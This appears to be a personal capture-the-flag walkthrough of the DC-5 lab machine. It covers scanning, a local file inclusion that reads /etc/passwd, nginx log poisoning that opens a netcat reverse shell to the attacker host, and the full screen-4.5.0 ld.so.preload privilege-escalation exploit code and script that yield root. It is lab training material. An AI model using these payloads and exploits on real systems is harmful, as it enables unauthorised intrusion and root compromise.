@@ -1,0 +1,297 @@
+
+root@saimson:~# nmap -sU -sT  -A 192.168.56.4 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 14:36 IST
+Nmap scan report for 192.168.56.4
+Host is up (0.00042s latency).
+Not shown: 1996 closed ports
+PORT    STATE         SERVICE VERSION
+80/tcp  open          http    nginx 1.6.2
+|_http-server-header: nginx/1.6.2
+|_http-title: Welcome
+111/tcp open          rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          40441/tcp   status
+|   100024  1          45708/udp6  status
+|   100024  1          46516/tcp6  status
+|_  100024  1          55328/udp   status
+68/udp  open|filtered dhcpc
+111/udp open          rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          40441/tcp   status
+|   100024  1          45708/udp6  status
+|   100024  1          46516/tcp6  status
+|_  100024  1          55328/udp   status
+MAC Address: 08:00:27:FD:07:13 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+
+
+
+root@saimson:~# dirbuster -u http://192.168.56.4 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+File found: /index.php - 200
+File found: /contact.php - 200
+Dir found: /images/ - 403
+Dir found: / - 200
+File found: /faq.php - 200
+File found: /solutions.php - 200
+File found: /about-us.php - 200
+File found: /footer.php - 200
+Dir found: /css/ - 403
+File found: /thankyou.php - 200
+root@saimson:~# 
+
+
+
+┌─[root@saimson]─[~/Desktop/.machine]
+└──╼ #wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt  -u http://192.168.56.4/thankyou.php?FUZZ=../../../../etc/passwd --hh=851
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.56.4/thankyou.php?FUZZ=../../../../etc/passwd
+Total requests: 949
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                 
+===================================================================
+
+000000340:   200        70 L     104 W    2319 Ch     "file"                                                                                                  
+
+Total time: 0.967503
+Processed Requests: 949
+Filtered Requests: 948
+Requests/sec.: 980.8754
+
+
+after this i just use thankyou.php?file=/etc/passwd
+and found it
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin dc:x:1000:1000:dc,,,:/home/dc:/bin/bash mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false 
+
+/etc/nginx/nginx.conf
+this log worked for me let's approach for somthing more
+/var/log/nginx/error.log   //now we can access th log of nginx 
+
+then just chek for the cmd function on it and worked
+
+http://192.168.56.4/thankyou.php?file=/var/log/nginx/error.log&cmd=nc%20-e%20/bin/sh%20192.168.56.1%201234
+
+file=/var/log/nginx/error.log&cmd=nc -e /bin/sh 192.168.56.1 1234
+
+
+got the shell
+
+after enumeration lets see the suid
+
+www-data@dc-5:~/html$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/su
+/bin/mount
+/bin/umount
+/bin/screen-4.5.0 //what's it lets google
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/sbin/exim4
+/sbin/mount.nfs
+www-data@dc-5:~/html$ 
+
+
+so i got explit in exploit db 41154.sh
+
+to do this we have to edit for exploit on local machine
+
+so let's do it
+
+the first block of the code shoud be as libhax.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+
+
+
+and the second block is as.... rootshell.c
+
+
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+
+
+
+
+and the lash one whater you want in my case 41154.sh
+the sh extention is important but....
+
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+
+
+let compile them
+
+┌─[root@saimson]─[~/Desktop/.machine/dc-5]
+└──╼ #gcc -fPIC -shared -ldl -o libhax.so libhax.c
+libhax.c: In function ‘dropshell’:
+libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+    7 |     chmod("/tmp/rootshell", 04755);
+      |     ^~~~~
+┌─[root@saimson]─[~/Desktop/.machine/dc-5]
+└──╼ #ls
+41152.txt  41154.sh  libhax.c  libhax.so  notes  rootshell.c  simson.c
+┌─[root@saimson]─[~/Desktop/.machine/dc-5]
+└──╼ #gcc -o rootshell rootshell.c 
+rootshell.c: In function ‘main’:
+rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    4 |     setgid(0);
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
+    5 |     seteuid(0);
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+    6 |     setegid(0);
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+    7 |     execvp("/bin/sh", NULL, NULL);
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
+
+
+
+you will get the warnings but it's ok
+
+let put that on server side///
+using python server and wget i 
+put in /tmp 
+
+www-data@dc-5:/tmp$ ls
+ls
+libhax.so  rootshell 
+
+
+www-data@dc-5:/tmp$ wget http://192.168.56.1:443/41154.sh
+wget http://192.168.56.1:443/41154.sh
+converted 'http://192.168.56.1:443/41154.sh' (ANSI_X3.4-1968) -> 'http://192.168.56.1:443/41154.sh' (UTF-8)
+--2020-05-20 15:52:13--  http://192.168.56.1:443/41154.sh
+Connecting to 192.168.56.1:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 247 [text/x-sh]
+Saving to: '41154.sh'
+
+41154.sh            100%[=====================>]     247  --.-KB/s   in 0s     
+
+2020-05-20 15:52:13 (12.5 MB/s) - '41154.sh' saved [247/247]
+
+www-data@dc-5:/tmp$ ls
+ls
+41154.sh  libhax.so  rootshell
+
+now just need we give the execute permission to the 
+sh file and execute it
+
+
+
+
+chmod 777 41154.sh
+www-data@dc-5:/tmp$ ./41154.sh
+./41154.sh
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# bash
+bash
+root@dc-5:/etc# ls
+
+
+i got root shell
+
+
+now time to get the flag
+
+
+root@dc-5:/root# cat thisistheflag.txt
+cat thisistheflag.txt
+
+
+888b    888 d8b                                                      888      888 888 888 
+8888b   888 Y8P                                                      888      888 888 888 
+88888b  888                                                          888      888 888 888 
+888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
+888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
+888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
+888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
+888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
+                                                                                          
+                                                                                          
+
+
+Once again, a big thanks to all those who do these little challenges,
+and especially all those who give me feedback - again, it's all greatly
+appreciated.  :-)
+
+I also want to send a big thanks to all those who find the vulnerabilities
+and create the exploits that make these challenges possible.
+
+root@dc-5:/root# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@dc-5:/root# whoami
+whoami
+root
+root@dc-5:/root# 
+
+let's moove to the next vm
+
+
